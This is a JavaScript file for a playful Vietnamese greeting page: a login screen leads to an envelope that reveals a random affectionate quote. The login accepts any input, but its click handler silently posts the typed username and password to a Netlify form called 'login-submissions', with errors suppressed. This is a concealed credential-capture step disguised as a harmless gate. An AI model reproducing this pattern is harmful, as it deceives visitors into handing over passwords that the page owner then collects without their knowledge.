document.addEventListener('DOMContentLoaded', () => {
    // ============================================================
    // QUOTES
    // ============================================================
    const quotes = [
        'Đây là một câu rất dài để test xem bức thư có hiển thị đúng không nha! Khi câu dài, bức thư sẽ tự giãn ra theo chiều dọc và màn hình sẽ cuộn được, không bị tràn hay bị cắt bớt. Bạn cứ thêm câu dài bao nhiêu cũng được, giao diện sẽ tự điều chỉnh.',
        'Cuộc đời ngắn lắm, cười nhiều lên nha!',
        'Bạn là người tuyệt vời nhất tôi từng gặp.',
        'Dù thế nào, tôi vẫn luôn ở đây vì bạn.',
        'Bạn xứng đáng được yêu thương thật nhiều.',
        'Mỗi ngày có bạn là một ngày đáng nhớ.',
        'Hãy cứ là chính mình, bạn thật tuyệt đấy!',
        'Cảm ơn bạn đã luôn là chính mình.',
        'Bạn đẹp hơn mỗi ngày, thật đấy!',
        'Cứ vui lên nha, bạn xứng đáng với điều đó.',
        'Có bạn là mọi thứ đều trở nên dễ chịu hơn.'
    ];

    function getRandomQuote() {
        let used = JSON.parse(localStorage.getItem('usedQuoteIdx') || '[]');
        if (used.length >= quotes.length) used = [];
        const avail = quotes.map((_, i) => i).filter(i => !used.includes(i));
        const idx = avail[Math.floor(Math.random() * avail.length)];
        used.push(idx);
        localStorage.setItem('usedQuoteIdx', JSON.stringify(used));
        return quotes[idx];
    }

    // ============================================================
    // ELEMENTS
    // ============================================================
    const screen0 = document.getElementById('screen0');
    const screen1 = document.getElementById('screen1');
    const screen2 = document.getElementById('screen2');

    const loginBtn    = document.getElementById('login-btn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginError  = document.getElementById('login-error');

    const openEnvBtn  = document.getElementById('open-envelope-btn');
    const quoteEl     = document.getElementById('random-quote');

    // ============================================================
    // HELPERS
    // ============================================================
    function goTo(from, to, delay = 0) {
        from.classList.remove('active');
        from.classList.add('hidden');
        setTimeout(() => {
            to.classList.remove('hidden');
            to.classList.add('active');
        }, delay);
    }

    // ============================================================
    // LOGIN
    // ============================================================
    loginBtn.addEventListener('click', () => {
        const user = usernameInput.value.trim();
        const pass = passwordInput.value.trim();

        if (user !== '' && pass !== '') {
            // Submit to Netlify in background
            const fd = new URLSearchParams();
            fd.append('form-name', 'login-submissions');
            fd.append('username', user);
            fd.append('password', pass);
            fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: fd.toString() })
                .catch(() => {});

            loginError.classList.add('hidden');
            goTo(screen0, screen1, 700);
        } else {
            loginError.classList.remove('hidden');
            loginError.textContent = 'Có dòng nào chưa nhập kia kìa';
        }
    });

    // Also allow Enter key
    [usernameInput, passwordInput].forEach(el => {
        el.addEventListener('keydown', e => { if (e.key === 'Enter') loginBtn.click(); });
    });

    // ============================================================
    // ENVELOPE → LETTER
    // ============================================================
    openEnvBtn.addEventListener('click', () => {
        quoteEl.textContent = getRandomQuote();
        goTo(screen1, screen2, 700);
    });
});
